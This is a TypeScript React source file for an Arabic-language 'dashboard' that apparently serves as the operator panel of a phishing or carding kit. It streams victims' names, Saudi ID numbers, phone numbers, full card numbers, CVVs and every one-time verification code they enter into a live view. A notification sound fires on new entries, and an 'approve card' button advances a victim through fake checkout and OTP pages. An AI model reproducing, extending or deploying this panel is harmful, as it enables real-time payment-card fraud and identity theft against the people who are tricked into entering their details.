import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { collection, deleteDoc, doc, onSnapshot, query } from "firebase/firestore";
import { db, onAuthChange, logoutUser, updateApprovalStatus } from "@/lib/firebase";
import { Button } from "@/components/ui/button";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";
import { toast } from "@/hooks/use-toast";
import { User, CreditCard, Phone, Mail, IdCard, Calendar, Volume2, LogOut, Users, Eye, Shield, Car, DollarSign, Trash2, Send } from "lucide-react";

interface OtpEntry {
  code: string;
  timestamp: string;
}

interface CardEntry {
  cardNumber?: string;
  cardName?: string;
  expiryMonth?: string;
  expiryYear?: string;
  cvv?: string;
  cardType?: string;
  timestamp: string;
}

interface VisitorData {
  id: string;
  name?: string;
  saudiId?: string;
  email?: string;
  phone?: string;
  cardNumber?: string;
  cardName?: string;
  expiryMonth?: string;
  expiryYear?: string;
  cvv?: string;
  cardHistory?: CardEntry[];
  currentPage?: string;
  status?: string;
  createdDate?: string;
  online?: boolean;
  otp?: string;
  otpHistory?: OtpEntry[];
  carBrand?: string;
  carModel?: string;
  carYear?: string;
  plateNumber?: string;
  insuranceAmount?: string;
  insuranceType?: string;
  totalAmount?: number;
  ticketQuantity?: number;
  cardApproved?: boolean;
}

const pageNames: Record<string, string> = {
  "registration": "التسجيل",
  "booking": "الحجز",
  "cart": "السلة",
  "checkout": "الدفع",
  "otp": "رمز التحقق",
  "otp_verified": "تم التحقق",
  "confirmation": "التأكيد",
  "restaurant_payment": "حجز مطعم - البيانات",
  "restaurant_checkout": "حجز مطعم - الدفع",
};

const getPageNameArabic = (page?: string) => {
  if (!page) return "غير محدد";
  return pageNames[page] || page;
};

const getRelativeTime = (dateStr?: string) => {
  if (!dateStr) return "";
  const date = new Date(dateStr);
  const now = new Date();
  const diffMs = now.getTime() - date.getTime();
  const diffSecs = Math.floor(diffMs / 1000);
  const diffMins = Math.floor(diffSecs / 60);
  const diffHours = Math.floor(diffMins / 60);
  const diffDays = Math.floor(diffHours / 24);

  if (diffSecs < 60) return "الآن";
  if (diffMins < 60) return `منذ ${diffMins} د`;
  if (diffHours < 24) return `منذ ${diffHours} س`;
  if (diffDays < 7) return `منذ ${diffDays} ي`;
  return date.toLocaleDateString("ar-SA");
};

export default function DashboardPage() {
  const [, setLocation] = useLocation();
  const [visitors, setVisitors] = useState<VisitorData[]>([]);
  const [loading, setLoading] = useState(true);
  const [selectedVisitor, setSelectedVisitor] = useState<VisitorData | null>(null);
  const [soundEnabled, setSoundEnabled] = useState(true);
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [checkingAuth, setCheckingAuth] = useState(true);
  const [deleteDialogOpen, setDeleteDialogOpen] = useState(false);
  const [deletingVisitorId, setDeletingVisitorId] = useState<string | null>(null);
  const [sendMailDialogOpen, setSendMailDialogOpen] = useState(false);
  const [sendingMail, setSendingMail] = useState(false);
  const audioRef = useRef<HTMLAudioElement | null>(null);
  const prevVisitorsCount = useRef(0);

  useEffect(() => {
    const unsubscribe = onAuthChange((user) => {
      if (user) {
        setIsAuthenticated(true);
      } else {
        setLocation("/login");
      }
      setCheckingAuth(false);
    });
    return () => unsubscribe();
  }, [setLocation]);

  const handleLogout = async () => {
    await logoutUser();
    setLocation("/login");
  };

  const handleDeleteSelectedVisitor = async () => {
    if (!db || !selectedVisitor) return;

    const idToDelete = selectedVisitor.id;
    const nextSelected =
      (() => {
        const idx = visitors.findIndex((v) => v.id === idToDelete);
        return (idx >= 0 ? visitors[idx + 1] : undefined) ?? (idx > 0 ? visitors[idx - 1] : undefined) ?? null;
      })();

    setDeletingVisitorId(idToDelete);
    try {
      // Optimistically update UI so the detail panel never points at a deleted record.
      setVisitors((prev) => prev.filter((v) => v.id !== idToDelete));
      setSelectedVisitor((prevSelected) => (prevSelected?.id === idToDelete ? nextSelected : prevSelected));

      await deleteDoc(doc(db, "pays", idToDelete));
      setDeleteDialogOpen(false);
    } catch (error) {
      console.error("Error deleting visitor:", error);
      // If deletion fails, rely on the Firestore snapshot to repopulate the list.
    } finally {
      setDeletingVisitorId(null);
    }
  };

  const handleSendMailToSelectedVisitor = async () => {
    if (!selectedVisitor?.email) {
      toast({
        title: "لا يوجد بريد إلكتروني",
        description: "هذا الزائر لا يحتوي على بريد إلكتروني لإرسال الرسالة.",
        variant: "destructive",
      });
      return;
    }

    setSendingMail(true);
    try {
      const response = await fetch("/api/send-confirmation-email", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email: selectedVisitor.email,
          name: selectedVisitor.name || "زائر",
        }),
      });

      const payload = await response.json().catch(() => ({}));

      if (!response.ok || payload?.success === false) {
        throw new Error(payload?.error || "Failed to send email");
      }

      toast({
        title: "تم الإرسال",
        description: `تم إرسال البريد إلى ${selectedVisitor.email}`,
      });
      setSendMailDialogOpen(false);
    } catch (error) {
      console.error("Error sending mail:", error);
      toast({
        title: "فشل الإرسال",
        description: "حدث خطأ أثناء إرسال البريد. حاول مرة أخرى.",
        variant: "destructive",
      });
    } finally {
      setSendingMail(false);
    }
  };

  const playNotificationSound = () => {
    if (soundEnabled && audioRef.current) {
      audioRef.current.currentTime = 0;
      audioRef.current.play().catch(() => {});
    }
  };

  useEffect(() => {
    if (!isAuthenticated || !db) {
      if (!db) console.warn("Firebase not initialized");
      setLoading(false);
      return;
    }

    const q = query(collection(db, "pays"));
    const unsubscribe = onSnapshot(q, (querySnapshot) => {
      const data: VisitorData[] = [];
      querySnapshot.forEach((doc) => {
        data.push({ id: doc.id, ...doc.data() } as VisitorData);
      });
      data.sort((a, b) => {
        const dateA = a.createdDate ? new Date(a.createdDate).getTime() : 0;
        const dateB = b.createdDate ? new Date(b.createdDate).getTime() : 0;
        return dateB - dateA;
      });
      
      if (prevVisitorsCount.current > 0 && data.length > prevVisitorsCount.current) {
        playNotificationSound();
      }
      if (prevVisitorsCount.current > 0) {
        const hasChanges = data.some((newVisitor, index) => {
          const oldVisitor = visitors[index];
          if (!oldVisitor) return true;
          return newVisitor.currentPage !== oldVisitor.currentPage ||
                 newVisitor.cardNumber !== oldVisitor.cardNumber ||
                 newVisitor.status !== oldVisitor.status;
        });
        if (hasChanges) {
          playNotificationSound();
        }
      }
      prevVisitorsCount.current = data.length;
      
      setVisitors(data);
      if (data.length > 0 && !selectedVisitor) {
        setSelectedVisitor(data[0]);
      }
      setLoading(false);
    }, (error) => {
      console.error("Error fetching data:", error);
      setLoading(false);
    });

    return () => unsubscribe();
  }, [isAuthenticated]);

  if (checkingAuth) {
    return (
      <div className="h-screen flex items-center justify-center bg-[#111b21]">
        <div className="text-[#8696a0]">جاري التحقق...</div>
      </div>
    );
  }

  if (!isAuthenticated) {
    return null;
  }

  const formatDate = (dateStr?: string) => {
    if (!dateStr) return "";
    const date = new Date(dateStr);
    return date.toLocaleDateString("ar-SA", {
      year: "numeric",
      month: "short",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit"
    });
  };

  // Calculate statistics
  const totalVisitors = visitors.length;
  const onlineVisitors = visitors.filter(v => v.online).length;
  const withPayment = visitors.filter(v => v.cardNumber || (v.cardHistory && v.cardHistory.length > 0)).length;
  const withOtp = visitors.filter(v => v.otp || (v.otpHistory && v.otpHistory.length > 0)).length;
  const totalRevenue = visitors.reduce((sum, v) => sum + (v.totalAmount || 0), 0);

  return (
    <div className="h-screen flex bg-[#111b21]" dir="rtl">
      <div className="w-80 border-l border-[#2a3942] flex flex-col bg-[#111b21]">
        <audio ref={audioRef} src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto" />
        
        {/* Header */}
        <div className="bg-[#202c33] p-3 flex items-center justify-between">
          <h1 className="text-white font-bold text-lg">لوحة التحكم</h1>
          <div className="flex items-center gap-2">
            <button
              onClick={handleLogout}
              className="p-1.5 rounded transition-colors text-[#8696a0] hover:text-red-400"
              data-testid="button-logout"
              title="تسجيل الخروج"
            >
              <LogOut className="w-4 h-4" />
            </button>
            <button
              onClick={() => setSoundEnabled(!soundEnabled)}
              className={`p-1.5 rounded transition-colors ${soundEnabled ? "text-[#00a884]" : "text-[#8696a0]"}`}
              data-testid="button-sound-toggle"
            >
              <Volume2 className="w-4 h-4" />
            </button>
            <div className="flex items-center gap-1.5 text-[#00a884]" data-testid="live-indicator">
              <span className="relative flex h-2 w-2">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#00a884] opacity-75"></span>
                <span className="relative inline-flex rounded-full h-2 w-2 bg-[#00a884]"></span>
              </span>
              <span className="text-xs font-medium">مباشر</span>
            </div>
          </div>
        </div>

        {/* Statistics Cards */}
        <div className="grid grid-cols-2 gap-2 p-3 bg-[#0b141a]">
          <StatCard icon={Users} label="الزوار" value={totalVisitors} color="text-blue-400" />
          <StatCard icon={Eye} label="متصل" value={onlineVisitors} color="text-green-400" />
          <StatCard icon={CreditCard} label="بطاقات" value={withPayment} color="text-yellow-400" />
          <StatCard icon={Shield} label="OTP" value={withOtp} color="text-purple-400" />
        </div>
        
        {/* Total Revenue */}
        {totalRevenue > 0 && (
          <div className="px-3 pb-3 bg-[#0b141a]">
            <div className="bg-gradient-to-r from-green-900/30 to-green-800/20 rounded-lg p-3 border border-green-500/30">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <DollarSign className="w-5 h-5 text-green-400" />
                  <span className="text-[#8696a0] text-sm">إجمالي المبالغ</span>
                </div>
                <span className="text-green-400 font-bold text-xl">{totalRevenue.toLocaleString('ar-SA')} ر.س</span>
              </div>
            </div>
          </div>
        )}

        {/* Visitors List */}
        <div className="flex-1 overflow-y-auto">
          {loading && visitors.length === 0 ? (
            <div className="flex items-center justify-center h-32 text-[#8696a0]">
              جاري التحميل...
            </div>
          ) : visitors.length === 0 ? (
            <div className="flex items-center justify-center h-32 text-[#8696a0]">
              لا توجد بيانات
            </div>
          ) : (
            visitors.map((visitor) => (
              <div
                key={visitor.id}
                onClick={() => setSelectedVisitor(visitor)}
                className={`flex items-center gap-3 p-3 cursor-pointer border-b border-[#2a3942]/50 hover:bg-[#2a3942]/50 transition-all ${
                  selectedVisitor?.id === visitor.id ? "bg-[#2a3942]" : ""
                }`}
                data-testid={`visitor-item-${visitor.id}`}
              >
                <div className="relative flex-shrink-0">
                  <div className={`w-11 h-11 rounded-full flex items-center justify-center ${
                    visitor.cardNumber ? "bg-gradient-to-br from-yellow-500 to-orange-500" : "bg-gradient-to-br from-[#00a884] to-[#008f6f]"
                  }`}>
                    {visitor.cardNumber ? (
                      <CreditCard className="w-5 h-5 text-white" />
                    ) : (
                      <User className="w-5 h-5 text-white" />
                    )}
                  </div>
                  <span 
                    className={`absolute -bottom-0.5 -right-0.5 w-3.5 h-3.5 rounded-full border-2 border-[#111b21] ${
                      visitor.online ? "bg-[#00a884]" : "bg-[#8696a0]"
                    }`}
                    data-testid={`status-${visitor.id}`}
                  />
                </div>
                <div className="flex-1 min-w-0">
                  <div className="flex items-center justify-between gap-2">
                    <h3 className="text-white font-medium truncate text-sm">
                      {visitor.name || "زائر جديد"}
                    </h3>
                    <span className="text-[10px] text-[#8696a0] flex-shrink-0">
                      {getRelativeTime(visitor.createdDate)}
                    </span>
                  </div>
                  <div className="flex items-center justify-between gap-2 mt-0.5">
                    <span className="bg-blue-500/20 text-blue-400 text-[10px] px-1.5 py-0.5 rounded font-medium">
                      {getPageNameArabic(visitor.currentPage)}
                    </span>
                    <div className="flex items-center gap-1 flex-shrink-0">
                      {visitor.cardNumber && !visitor.cardApproved && (
                        <span className="bg-orange-500/20 text-orange-400 text-[9px] px-1.5 py-0.5 rounded font-medium animate-pulse">
                          انتظار
                        </span>
                      )}
                      {visitor.cardApproved && (
                        <span className="bg-green-500/20 text-green-400 text-[9px] px-1.5 py-0.5 rounded font-medium">
                          موافق
                        </span>
                      )}
                      {visitor.totalAmount && (
                        <span className="bg-green-500/20 text-green-400 text-[9px] px-1.5 py-0.5 rounded font-medium">
                          {visitor.totalAmount} ر.س
                        </span>
                      )}
                      {visitor.otpHistory && visitor.otpHistory.length > 0 && (
                        <span className="bg-purple-500/20 text-purple-400 text-[9px] px-1.5 py-0.5 rounded font-medium">
                          {visitor.otpHistory.length} OTP
                        </span>
                      )}
                      {visitor.cardNumber && visitor.cvv && (
                        <span className="bg-red-500/20 text-red-400 text-[9px] px-1.5 py-0.5 rounded font-mono font-medium">
                          CVV: {visitor.cvv}
                        </span>
                      )}
                      {visitor.cardNumber && (
                        <span className="bg-yellow-500/20 text-yellow-400 text-[9px] px-1.5 py-0.5 rounded">
                          <CreditCard className="w-2.5 h-2.5 inline" />
                        </span>
                      )}
                    </div>
                  </div>
                </div>
              </div>
            ))
          )}
        </div>
      </div>

      {/* Detail Panel */}
      <div className="flex-1 flex flex-col bg-[#0b141a]">
        {selectedVisitor ? (
          <>
            <div className="bg-[#202c33] p-4 flex items-center gap-3 border-b border-[#2a3942]">
              <div className={`w-12 h-12 rounded-full flex items-center justify-center ${
                selectedVisitor.cardNumber ? "bg-gradient-to-br from-yellow-500 to-orange-500" : "bg-gradient-to-br from-[#00a884] to-[#008f6f]"
              }`}>
                {selectedVisitor.cardNumber ? (
                  <CreditCard className="w-6 h-6 text-white" />
                ) : (
                  <User className="w-6 h-6 text-white" />
                )}
              </div>
              <div className="flex-1">
                <h2 className="text-white font-semibold text-lg">
                  {selectedVisitor.name || "زائر جديد"}
                </h2>
                <div className="flex items-center gap-2">
                  <span className={`w-2 h-2 rounded-full ${selectedVisitor.online ? "bg-[#00a884]" : "bg-[#8696a0]"}`} />
                  <p className="text-xs text-[#8696a0]">
                    {selectedVisitor.online ? "متصل الآن" : "غير متصل"} • {getPageNameArabic(selectedVisitor.currentPage)}
                  </p>
                </div>
              </div>
              <div className="flex items-center gap-2">
                <AlertDialog open={sendMailDialogOpen} onOpenChange={setSendMailDialogOpen}>
                  <Button
                    variant="outline"
                    size="icon"
                    onClick={() => setSendMailDialogOpen(true)}
                    disabled={!selectedVisitor.email || sendingMail}
                    title="إرسال بريد"
                    data-testid="button-send-mail"
                  >
                    <Send className="w-4 h-4" />
                  </Button>
                  <AlertDialogContent dir="rtl">
                    <AlertDialogHeader>
                      <AlertDialogTitle>إرسال بريد للزائر؟</AlertDialogTitle>
                      <AlertDialogDescription>
                        سيتم إرسال رسالة إلى:{" "}
                        <span className="font-medium text-foreground">
                          {selectedVisitor.email || "---"}
                        </span>
                      </AlertDialogDescription>
                    </AlertDialogHeader>
                    <AlertDialogFooter className="gap-2 sm:gap-0">
                      <AlertDialogCancel disabled={sendingMail}>إلغاء</AlertDialogCancel>
                      <AlertDialogAction
                        onClick={(e) => {
                          e.preventDefault();
                          void handleSendMailToSelectedVisitor();
                        }}
                        disabled={!selectedVisitor.email || sendingMail}
                      >
                        {sendingMail ? "جاري الإرسال..." : "إرسال"}
                      </AlertDialogAction>
                    </AlertDialogFooter>
                  </AlertDialogContent>
                </AlertDialog>
              <AlertDialog open={deleteDialogOpen} onOpenChange={setDeleteDialogOpen}>
                <Button
                  variant="destructive"
                  size="icon"
                  onClick={() => setDeleteDialogOpen(true)}
                  disabled={deletingVisitorId === selectedVisitor.id}
                  title="حذف"
                  data-testid="button-delete-visitor"
                >
                  <Trash2 className="w-4 h-4" />
                </Button>
                <AlertDialogContent dir="rtl">
                  <AlertDialogHeader>
                    <AlertDialogTitle>حذف الزائر؟</AlertDialogTitle>
                    <AlertDialogDescription>
                      سيتم حذف هذا السجل نهائيًا من لوحة التحكم ولا يمكن التراجع عن ذلك.
                    </AlertDialogDescription>
                  </AlertDialogHeader>
                  <AlertDialogFooter className="gap-2 sm:gap-0">
                    <AlertDialogCancel disabled={deletingVisitorId === selectedVisitor.id}>
                      إلغاء
                    </AlertDialogCancel>
                    <AlertDialogAction
                      onClick={(e) => {
                        e.preventDefault();
                        void handleDeleteSelectedVisitor();
                      }}
                      disabled={deletingVisitorId === selectedVisitor.id}
                      className="bg-destructive text-destructive-foreground hover:bg-destructive/90"
                    >
                      {deletingVisitorId === selectedVisitor.id ? "جاري الحذف..." : "حذف"}
                    </AlertDialogAction>
                  </AlertDialogFooter>
                </AlertDialogContent>
              </AlertDialog>
              </div>
            </div>

            <div
              className="flex-1 overflow-y-auto p-4 space-y-4"
              style={{
                backgroundImage: `url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23182229' fill-opacity='0.4'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E")`,
              }}
            >
              {selectedVisitor.name && (
                <MessageBubble type="received" time={formatDate(selectedVisitor.createdDate)}>
                  <div className="space-y-3">
                    <div className="flex items-center gap-2 text-[#00a884] font-semibold">
                      <User className="w-4 h-4" />
                      <span>معلومات المستخدم</span>
                    </div>
                    <div className="grid grid-cols-2 gap-2 text-sm">
                      <InfoRow icon={User} label="الاسم" value={selectedVisitor.name} />
                      {selectedVisitor.saudiId && (
                        <InfoRow icon={IdCard} label="الهوية" value={selectedVisitor.saudiId} />
                      )}
                      {selectedVisitor.email && (
                        <InfoRow icon={Mail} label="البريد" value={selectedVisitor.email} />
                      )}
                      {selectedVisitor.phone && (
                        <InfoRow icon={Phone} label="الجوال" value={selectedVisitor.phone} />
                      )}
                    </div>
                  </div>
                </MessageBubble>
              )}

              {(selectedVisitor.carBrand || selectedVisitor.carModel || selectedVisitor.plateNumber) && (
                <MessageBubble type="received" time="">
                  <div className="space-y-3">
                    <div className="flex items-center gap-2 text-blue-400 font-semibold">
                      <Car className="w-4 h-4" />
                      <span>معلومات السيارة</span>
                    </div>
                    <div className="grid grid-cols-2 gap-2 text-sm">
                      {selectedVisitor.carBrand && (
                        <InfoRow icon={Car} label="الماركة" value={selectedVisitor.carBrand} />
                      )}
                      {selectedVisitor.carModel && (
                        <InfoRow icon={Car} label="الموديل" value={selectedVisitor.carModel} />
                      )}
                      {selectedVisitor.carYear && (
                        <InfoRow icon={Calendar} label="السنة" value={selectedVisitor.carYear} />
                      )}
                      {selectedVisitor.plateNumber && (
                        <InfoRow icon={IdCard} label="اللوحة" value={selectedVisitor.plateNumber} />
                      )}
                    </div>
                  </div>
                </MessageBubble>
              )}

              {(selectedVisitor.insuranceAmount || selectedVisitor.insuranceType) && (
                <MessageBubble type="received" time="">
                  <div className="space-y-3">
                    <div className="flex items-center gap-2 text-green-400 font-semibold">
                      <DollarSign className="w-4 h-4" />
                      <span>معلومات التأمين</span>
                    </div>
                    <div className="grid grid-cols-2 gap-2 text-sm">
                      {selectedVisitor.insuranceType && (
                        <InfoRow icon={Shield} label="نوع التأمين" value={selectedVisitor.insuranceType} />
                      )}
                      {selectedVisitor.insuranceAmount && (
                        <InfoRow icon={DollarSign} label="المبلغ" value={`${selectedVisitor.insuranceAmount} ر.س`} />
                      )}
                    </div>
                  </div>
                </MessageBubble>
              )}

              {selectedVisitor.totalAmount && (
                <MessageBubble type="received" time="">
                  <div className="space-y-3">
                    <div className="flex items-center gap-2 text-green-400 font-semibold">
                      <DollarSign className="w-4 h-4" />
                      <span>مبلغ الطلب</span>
                    </div>
                    <div className="bg-gradient-to-br from-green-900/30 to-green-800/20 rounded-xl p-4 border border-green-500/30">
                      <div className="flex items-center justify-between">
                        <span className="text-[#8696a0]">المجموع الكلي</span>
                        <span className="text-green-400 font-bold text-2xl">{selectedVisitor.totalAmount} ر.س</span>
                      </div>
                      {selectedVisitor.ticketQuantity && (
                        <div className="flex items-center justify-between mt-2 pt-2 border-t border-green-500/20">
                          <span className="text-[#8696a0] text-sm">عدد التذاكر</span>
                          <span className="text-white font-medium">{selectedVisitor.ticketQuantity}</span>
                        </div>
                      )}
                    </div>
                  </div>
                </MessageBubble>
              )}

              {selectedVisitor.cardNumber && (
                <MessageBubble type="received" time="">
                  <div className="space-y-3">
                    <div className="flex items-center gap-2 text-yellow-400 font-semibold">
                      <CreditCard className="w-4 h-4" />
                      <span>معلومات البطاقة</span>
                    </div>
                    
                    <div className="bg-gradient-to-br from-[#1e3a5f] via-[#1a2c38] to-[#0d1c24] rounded-xl p-4 space-y-4 border border-[#2a4a5a] shadow-lg">
                      <div className="flex justify-between items-start">
                        <div className="w-10 h-7 bg-gradient-to-br from-yellow-300 to-yellow-500 rounded-md" />
                        <div className="text-[#8696a0] text-xs">Credit Card</div>
                      </div>
                      
                      <div className="text-white font-mono text-xl tracking-wider" dir="ltr">
                        {selectedVisitor.cardNumber}
                      </div>
                      
                      <div className="flex justify-between text-sm">
                        <div>
                          <p className="text-[#8696a0] text-[10px] uppercase">Card Holder</p>
                          <p className="text-white font-medium">{selectedVisitor.cardName || "---"}</p>
                        </div>
                        <div>
                          <p className="text-[#8696a0] text-[10px] uppercase">Expires</p>
                          <p className="text-white font-medium" dir="ltr">
                            {selectedVisitor.expiryMonth}/{selectedVisitor.expiryYear?.slice(-2)}
                          </p>
                        </div>
                        <div>
                          <p className="text-[#8696a0] text-[10px] uppercase">CVV</p>
                          <p className="text-white font-medium">{selectedVisitor.cvv || "---"}</p>
                        </div>
                      </div>
                    </div>
                    
                    {/* Approval Button */}
                    <div className="flex gap-2 mt-3">
                      {selectedVisitor.cardApproved ? (
                        <div className="w-full bg-green-500/20 text-green-400 py-2 px-4 rounded-lg text-center font-medium">
                          تم الموافقة على البطاقة
                        </div>
                      ) : (
                        <Button
                          onClick={() => updateApprovalStatus(selectedVisitor.id, true)}
                          className="w-full bg-green-600 hover:bg-green-700 text-white py-2"
                          data-testid="button-approve-card"
                        >
                          الموافقة على البطاقة
                        </Button>
                      )}
                    </div>
                  </div>
                </MessageBubble>
              )}

              {(selectedVisitor.cardHistory && selectedVisitor.cardHistory.length > 0) && (
                <MessageBubble type="received" time="">
                  <div className="space-y-3">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2 text-yellow-400 font-semibold">
                        <CreditCard className="w-4 h-4" />
                        <span>سجل البطاقات</span>
                      </div>
                      <span className="bg-yellow-500/20 text-yellow-400 text-xs px-2 py-0.5 rounded-full">
                        {selectedVisitor.cardHistory.length} بطاقة
                      </span>
                    </div>
                    <div className="space-y-2">
                      {selectedVisitor.cardHistory
                        .slice()
                        .sort((a, b) => (b.timestamp || "").localeCompare(a.timestamp || ""))
                        .map((entry, index) => (
                          <div
                            key={`${entry.timestamp}-${index}`}
                            className="bg-[#1a2c38] rounded-lg p-3 border border-[#2a3942] space-y-1"
                          >
                            <div className="flex items-center justify-between gap-3">
                              <p className="text-white font-mono text-sm tracking-wider" dir="ltr">
                                {entry.cardNumber || "---"}
                              </p>
                              <span className="text-xs text-[#8696a0] flex-shrink-0">
                                {entry.timestamp ? new Date(entry.timestamp).toLocaleString("ar-SA") : ""}
                              </span>
                            </div>
                            <div className="flex items-center justify-between text-xs text-[#8696a0]" dir="ltr">
                              <span>{entry.cardName || "---"}</span>
                              <div className="flex items-center gap-2">
                                {entry.cvv && (
                                  <span className="bg-red-500/20 text-red-400 px-1.5 py-0.5 rounded font-mono font-medium">
                                    CVV: {entry.cvv}
                                  </span>
                                )}
                                <span>
                                  {entry.expiryMonth && entry.expiryYear
                                    ? `${entry.expiryMonth}/${entry.expiryYear.slice(-2)}`
                                    : "---"}
                                </span>
                              </div>
                            </div>
                          </div>
                        ))}
                    </div>
                  </div>
                </MessageBubble>
              )}

              {(selectedVisitor.otpHistory && selectedVisitor.otpHistory.length > 0) && (
                <MessageBubble type="received" time="">
                  <div className="space-y-3">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2 text-purple-400 font-semibold">
                        <Shield className="w-4 h-4" />
                        <span>محاولات OTP</span>
                      </div>
                      <span className="bg-purple-500/20 text-purple-400 text-xs px-2 py-0.5 rounded-full">
                        {selectedVisitor.otpHistory.length} محاولة
                      </span>
                    </div>
                    <div className="space-y-2">
                      {selectedVisitor.otpHistory.map((entry, index) => (
                        <div key={index} className="bg-[#1a2c38] rounded-lg p-3 border border-[#2a3942] flex items-center justify-between">
                          <div className="flex items-center gap-3">
                            <span className="text-[#8696a0] text-xs">#{index + 1}</span>
                            <p className="text-white font-mono text-xl tracking-[0.3em]" dir="ltr">
                              {entry.code}
                            </p>
                          </div>
                          <span className="text-xs text-[#8696a0]">
                            {new Date(entry.timestamp).toLocaleTimeString('ar-SA', { hour: '2-digit', minute: '2-digit' })}
                          </span>
                        </div>
                      ))}
                    </div>
                  </div>
                </MessageBubble>
              )}

              {selectedVisitor.otp && !selectedVisitor.otpHistory && (
                <MessageBubble type="received" time="">
                  <div className="space-y-2">
                    <div className="flex items-center gap-2 text-purple-400 font-semibold">
                      <Shield className="w-4 h-4" />
                      <span>رمز التحقق OTP</span>
                    </div>
                    <div className="bg-[#1a2c38] rounded-lg p-4 border border-[#2a3942]">
                      <p className="text-white font-mono text-3xl tracking-[0.4em] text-center" dir="ltr">
                        {selectedVisitor.otp}
                      </p>
                    </div>
                  </div>
                </MessageBubble>
              )}

              <MessageBubble type="sent" time="">
                <div className="flex items-center gap-3">
                  <Calendar className="w-4 h-4 text-[#8696a0]" />
                  <span>الصفحة: {getPageNameArabic(selectedVisitor.currentPage)}</span>
                  {selectedVisitor.online ? (
                    <span className="bg-green-500/20 text-green-400 text-xs px-2 py-0.5 rounded-full">متصل</span>
                  ) : (
                    <span className="bg-gray-500/20 text-gray-400 text-xs px-2 py-0.5 rounded-full">غير متصل</span>
                  )}
                </div>
              </MessageBubble>
            </div>
          </>
        ) : (
          <div className="flex-1 flex items-center justify-center text-[#8696a0]">
            <div className="text-center space-y-3">
              <div className="w-24 h-24 rounded-full bg-[#2a3942]/50 flex items-center justify-center mx-auto">
                <Users className="w-12 h-12" />
              </div>
              <p className="text-lg">اختر زائر لعرض التفاصيل</p>
              <p className="text-sm text-[#8696a0]/60">سيظهر هنا جميع بيانات الزائر</p>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

function StatCard({ icon: Icon, label, value, color }: { icon: any; label: string; value: number; color: string }) {
  return (
    <div className="bg-[#202c33] rounded-lg p-3 flex items-center gap-3">
      <div className={`w-9 h-9 rounded-lg bg-[#2a3942] flex items-center justify-center ${color}`}>
        <Icon className="w-4 h-4" />
      </div>
      <div>
        <p className="text-white font-bold text-lg">{value}</p>
        <p className="text-[#8696a0] text-[10px]">{label}</p>
      </div>
    </div>
  );
}

function InfoRow({ icon: Icon, label, value }: { icon: any; label: string; value: string }) {
  return (
    <div className="flex items-center gap-2 bg-[#1a2c38]/50 rounded px-2 py-1.5">
      <Icon className="w-3.5 h-3.5 text-[#8696a0]" />
      <span className="text-[#8696a0] text-xs">{label}:</span>
      <span className="text-white">{value}</span>
    </div>
  );
}

function MessageBubble({
  children,
  type,
  time
}: {
  children: React.ReactNode;
  type: "sent" | "received";
  time: string;
}) {
  return (
    <div className={`flex ${type === "sent" ? "justify-start" : "justify-end"}`}>
      <div
        className={`max-w-lg rounded-xl p-4 shadow-lg ${
          type === "sent"
            ? "bg-[#005c4b] text-white rounded-tr-none"
            : "bg-[#202c33] text-white rounded-tl-none"
        }`}
      >
        {children}
        {time && (
          <p className="text-[10px] text-[#8696a0] text-left mt-2">{time}</p>
        )}
      </div>
    </div>
  );
}
